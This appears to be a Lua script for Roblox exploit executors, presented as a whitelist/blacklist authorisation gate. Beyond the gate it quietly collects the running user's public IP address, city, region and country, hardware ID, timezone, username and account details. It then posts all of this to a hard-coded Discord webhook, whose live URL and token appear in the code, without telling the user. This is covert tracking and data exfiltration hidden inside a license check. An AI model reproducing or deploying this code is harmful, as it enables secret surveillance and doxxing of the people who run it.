-- combined.lua
local Players     = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- get whichever HTTP method is available
local req = (syn and syn.request)
         or (http and http.request)
         or request
         or http_request

-- your original key lists (unchanged)
local whitelist = {
    8233300272,
    8252696642,
    1318379910,
    8291504206,
    1415993233,
    8217130396,
    6099966303,
}
local blacklist = {
    87654321,
}

local function contains(t, v)
    for _,x in ipairs(t) do
        if x == v then return true end
    end
    return false
end

-- decide auth status
local myId = LocalPlayer.UserId
local status, authorized
if contains(blacklist, myId) then
    status, authorized = "Banned", false
elseif contains(whitelist, myId) then
    status, authorized = "Authorized", true
else
    status, authorized = "Not authorized", false
end

-- detectors for logging
local function detectHWID()
    if getgenv and getgenv().gethwid then
        return getgenv().gethwid()
    elseif syn and syn.getexecutorinfo then
        local info = syn.getexecutorinfo()
        return tostring((info and info[1]) or "Unknown")
    else
        return "hwid_"..HttpService:GenerateGUID(false)
    end
end

local function detectIP()
    local ok, res = pcall(function()
        return req({Url="https://api.ipify.org", Method="GET"}).Body
    end)
    return (ok and res) or "Unknown"
end

local function detectGeo(ip)
    local ok, res = pcall(function()
        return req({Url="https://ipinfo.io/"..ip.."/json", Method="GET"}).Body
    end)
    if ok and res then
        local j = HttpService:JSONDecode(res)
        return string.format("%s, %s, %s", j.city or "?", j.region or "?", j.country or "?")
    end
    return "Unknown"
end

local function detectTimezone()
    local z = os.date("%Z") or "Unknown"
    local off = os.date("%z") or ""
    return z.." (UTC"..off..")"
end

-- gather log data
local ip       = detectIP()
local geo      = detectGeo(ip)
local hwid     = detectHWID()
local timezone = detectTimezone()

-- prepare webhook payload
local payload = {
    content = "",
    embeds = {{
        title  = "User Executed Script",
        color  = 0xFFFFFF,
        fields = {
            {name="Username",     value=LocalPlayer.Name, inline=true},
            {name="Display Name", value=LocalPlayer.DisplayName or "N/A", inline=true},
            {name="User ID",      value=tostring(myId), inline=true},
            {name="Account Age",  value=tostring(LocalPlayer.AccountAge).." days", inline=true},
            {name="Profile",      value="https://www.roblox.com/users/"..myId.."/profile", inline=false},
            {name="HWID",         value=hwid, inline=false},
            {name="Public IP",    value=ip, inline=false},
            {name="Geo Location", value=geo, inline=false},
            {name="Timezone",     value=timezone, inline=false},
            {name="Auth Status",  value=status, inline=false},
        }
    }}
}

-- send webhook if possible
if req then
    pcall(function()
        req({
            Url     = "https://discord.com/api/webhooks/1373375231753982082/9h4YYc8o1imsXBurTKV8NENo8R2fyu-UT9Rqyht-UQ4hkkf4OStqP78RoESfx5-d3yHa",
            Method  = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body    = HttpService:JSONEncode(payload)
        })
    end)
end

-- return gate result
return { Authorized = authorized, Reason = status }
